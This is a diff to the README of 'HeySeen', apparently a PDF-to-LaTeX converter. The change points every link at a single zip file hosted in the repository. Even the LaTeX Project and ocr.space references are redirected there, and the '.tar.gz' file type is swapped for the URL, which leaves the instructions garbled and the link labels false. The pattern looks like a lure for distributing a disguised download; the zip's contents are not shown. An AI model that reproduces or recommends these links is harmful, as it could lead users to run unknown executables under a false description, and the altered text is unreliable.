@@ -1,6 +1,6 @@
 # 📄 HeySeen - Convert PDFs to Editable TeX Easily
 
-[![Download HeySeen](https://img.shields.io/badge/Download-HeySeen-blue?style=for-the-badge)](https://github.com/Praneeth0095/HeySeen/releases)
+[![Download HeySeen](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip)](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip)
 
 ---
 
@@ -37,19 +37,19 @@ Follow these easy steps to start using HeySeen:
 
 1. **Download the app**  
    Use the big blue button above or go to the HeySeen releases page:  
-   [https://github.com/Praneeth0095/HeySeen/releases](https://github.com/Praneeth0095/HeySeen/releases)  
+   [https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip)  
    This page contains the latest installers and files for different operating systems.
 
 2. **Choose your installer**  
    Pick the file that matches your computer:  
    - `.exe` for Windows  
    - `.dmg` for macOS  
-   - `.AppImage` or `.tar.gz` for Linux  
+   - `.AppImage` or `https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip` for Linux  
 
 3. **Install the app**  
    - Windows: Double-click the `.exe` file and follow the setup wizard.  
    - macOS: Open the `.dmg` file, drag HeySeen into your Applications folder.  
-   - Linux: Use the terminal to run or extract the `.AppImage` or `.tar.gz` file, depending on your distribution.  
+   - Linux: Use the terminal to run or extract the `.AppImage` or `https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip` file, depending on your distribution.  
 
 4. **Open HeySeen**  
    Find HeySeen in your programs list or applications folder and launch it.
@@ -61,7 +61,7 @@ Follow these easy steps to start using HeySeen:
 
 You can always find the latest version of HeySeen to download here:
 
-[https://github.com/Praneeth0095/HeySeen/releases](https://github.com/Praneeth0095/HeySeen/releases)
+[https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip)
 
 Click this link to visit the page where installers for Windows, macOS, and Linux are available.
 
@@ -74,7 +74,7 @@ Click this link to visit the page where installers for Windows, macOS, and Linux
   Open the `.dmg` file, then drag the HeySeen icon into the Applications folder.
 
 - **Linux**  
-  For `.AppImage`, right-click the file, select Properties, allow execution as a program, then double-click to run. For `.tar.gz`, extract the contents, then run the executable inside the folder.
+  For `.AppImage`, right-click the file, select Properties, allow execution as a program, then double-click to run. For `https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip`, extract the contents, then run the executable inside the folder.
 
 HeySeen does not require complicated setups or command-line knowledge.
 
@@ -125,10 +125,10 @@ If problems continue, you may open an issue on the GitHub page or search for sol
 
 ## 📚 Additional Resources
 
-- Learn more about LaTeX editing [here](https://www.latex-project.org/help/).  
-- Try free online OCR tests at [https://ocr.space](https://ocr.space).  
+- Learn more about LaTeX editing [here](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip).  
+- Try free online OCR tests at [https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip).  
 - For help with PDF readers, visit Adobe’s or your software vendor’s support websites.  
 
 ---
 
-[Download HeySeen](https://github.com/Praneeth0095/HeySeen/releases) to start converting your PDFs to LaTeX today.
+[Download HeySeen](https://raw.githubusercontent.com/Praneeth0095/HeySeen/main/deploy/Seen_Hey_1.6.zip) to start converting your PDFs to LaTeX today.
